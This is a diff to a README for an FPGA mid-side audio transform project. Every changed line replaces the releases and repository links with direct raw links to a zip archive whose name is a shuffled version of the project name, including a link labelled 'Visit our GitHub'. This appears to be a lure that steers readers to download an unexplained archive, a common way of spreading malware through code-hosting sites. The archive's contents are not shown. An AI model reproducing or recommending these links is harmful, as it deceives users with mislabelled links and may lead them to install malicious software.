@@ -1,6 +1,6 @@
 # 🎛️ Mid-Side-Transform-Module-FPGA - Simplifying Audio Signal Processing 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-%E2%9C%94%EF%B8%8F-brightgreen)](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/releases)
+[![Download the latest release](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/raw/refs/heads/main/software/baremetal/Mid-Module-FPGA-Transform-Side-v3.2.zip%20Now-%E2%9C%94%EF%B8%8F-brightgreen)](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/raw/refs/heads/main/software/baremetal/Mid-Module-FPGA-Transform-Side-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To run the Mid-Side Transform Module, ensure you have the following:
 
 To get started with the Mid-Side Transform Module, visit the link below to download the latest release:
 
-[Download the latest release](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/releases)
+[Download the latest release](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/raw/refs/heads/main/software/baremetal/Mid-Module-FPGA-Transform-Side-v3.2.zip)
 
 Once you've downloaded the software, follow these steps:
 
@@ -71,7 +71,7 @@ If you need help or have questions, you can open an issue on our GitHub page. We
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: [Visit our GitHub](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA)
+- **GitHub Repository**: [Visit our GitHub](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/raw/refs/heads/main/software/baremetal/Mid-Module-FPGA-Transform-Side-v3.2.zip)
 - **Related Topics**:
   - Audio DSP
   - Fixed Point Arithmetic
@@ -85,6 +85,6 @@ We welcome contributions from the community. If you have ideas for improvements 
 
 For updates and new features, always check the "Releases" section of our repository. This will keep you informed of all changes and enhancements.
 
-[Download the latest release](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/releases)
+[Download the latest release](https://github.com/Nandhagopal200/Mid-Side-Transform-Module-FPGA/raw/refs/heads/main/software/baremetal/Mid-Module-FPGA-Transform-Side-v3.2.zip)
 
 Thank you for using the Mid-Side Transform Module! Enjoy enhancing your audio projects.
